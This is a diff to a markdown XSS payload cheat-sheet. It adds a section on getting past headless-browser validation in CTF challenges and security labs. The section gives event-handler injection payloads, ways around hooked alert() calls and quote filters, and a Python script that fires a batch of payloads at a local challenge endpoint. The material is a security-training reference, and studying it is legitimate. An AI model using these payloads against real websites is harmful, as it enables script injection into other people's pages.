@@ -38,6 +38,7 @@
 - [Bypass using UTF-32](#bypass-using-utf-32)
 - [Bypass using BOM](#bypass-using-bom)
 - [Bypass using JSfuck](#bypass-using-jsfuck)
+- [Bypass Headless Browser Validation (CTF / Security Labs)](#bypass-headless-browser-validation-ctf--security-labs)
 - [References](#references)
 
 ## Bypass Case Sensitive
@@ -571,6 +572,119 @@ Bypass using [jsfuck](http://www.jsfuck.com/)
 
 ```javascript
 [][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()
+```
+
+## Bypass Headless Browser Validation (CTF / Security Labs)
+
+Many CTF challenges and security labs validate XSS by rendering your payload in a headless browser and checking if `alert("XSS")` fires. Different headless browsers have different quirks.
+
+### PhantomJS
+
+PhantomJS uses an old WebKit engine. It captures `alert()`, `confirm()`, and `prompt()` via `page.onAlert`, `page.onConfirm`, `page.onPrompt`. Commonly dispatches `focus` events on elements with `autofocus`/`onfocus` attributes.
+
+**Best event handlers for PhantomJS:**
+```html
+<input autofocus onfocus=alert("XSS")>
+<textarea autofocus onfocus=alert("XSS")>
+<select autofocus onfocus=alert("XSS")>
+<body onload=alert("XSS")>
+<img src=x onerror=alert("XSS")>
+```
+
+**Avoid with PhantomJS** (may not fire or cause TypeErrors):
+- `ontoggle` (details element poorly supported)
+- `onanimationend`, `onpointerover` (modern events not supported)
+- Complex `String.fromCharCode` in some contexts (can cause setter errors)
+
+### Puppeteer / Playwright (modern Chromium)
+
+These use a real Chromium engine. They support all modern events but typically don't interact with the page (no mouse movement, no clicks) unless the challenge script explicitly does so.
+
+**Best event handlers for Puppeteer/Playwright:**
+```html
+<img src=x onerror=alert("XSS")>
+<input autofocus onfocus=alert("XSS")>
+<body onload=alert("XSS")>
+<details open ontoggle=alert("XSS")>
+<style onload=alert("XSS")>
+```
+
+### Bypassing alert() hooks
+
+Some challenges override `alert()` with a custom function that checks the argument. If your payload causes a TypeError or wrong value:
+
+```javascript
+// Direct string - simplest approach
+alert("XSS")
+
+// If quotes are filtered, use alternatives:
+alert(String.fromCharCode(88,83,83))
+alert(atob("WFNT"))
+alert("\x58\x53\x53")
+alert("\u0058\u0053\u0053")
+alert(`XSS`)
+
+// If alert is hooked, get the original from an iframe:
+x=document.createElement("iframe");document.body.appendChild(x);x.contentWindow.alert("XSS")
+
+// Or use a fresh window context:
+open().alert("XSS")
+
+// Array method alternatives (pass "XSS" as argument):
+["XSS"].find(alert)
+["XSS"].map(alert)
+["XSS"].filter(alert)
+["XSS"].forEach(alert)
+["XSS"].every(alert)
+
+// Via window object:
+window["alert"]("XSS")
+self["alert"]("XSS")
+top["alert"]("XSS")
+```
+
+### Handling quote blacklists in alert arguments
+
+When single quotes `'` are blacklisted but you need to pass a string to alert:
+
+```html
+<!-- Use double quotes (if not inside a double-quoted attribute) -->
+<input autofocus onfocus=alert("XSS")>
+
+<!-- Use HTML entities inside event handler attributes -->
+<input autofocus onfocus="alert(&#34;XSS&#34;)">
+<input autofocus onfocus="alert(&quot;XSS&quot;)">
+
+<!-- Use backticks (template literals) -->
+<input autofocus onfocus=alert(`XSS`)>
+
+<!-- Encoding-based approaches (no quotes needed) -->
+<input autofocus onfocus=alert(String.fromCharCode(88,83,83))>
+<input autofocus onfocus=alert(atob(/WFNT/.source))>
+```
+
+### Rapid iteration strategy
+
+When a challenge gives you feedback (e.g., "You did an alert with X instead of Y"), write a python script to test multiple payloads at once:
+
+```python
+import requests
+
+target = "http://localhost:5000/xss25"
+payloads = [
+    '<input autofocus onfocus=alert("XSS")>',
+    '<input autofocus onfocus="alert(String.fromCharCode(88,83,83))">',
+    '<input autofocus onfocus=alert(`XSS`)>',
+    '<img src=x onerror=alert("XSS")>',
+    '<body onload=alert("XSS")>',
+    '<details open ontoggle=alert("XSS")>',
+    '"><input autofocus onfocus=alert("XSS")>',
+]
+
+for p in payloads:
+    r = requests.post(target, data={"solution": p})
+    status = "FLAG" if "flag" in r.text.lower() or "Congratulations" in r.text else r.text[r.text.find("Oops"):r.text.find("</div>")] if "Oops" in r.text else "No alert"
+    print(f"[{'OK' if 'FLAG' in status else 'FAIL'}] {p[:60]:<60} => {status[:80]}")
 ```
 
 ## References
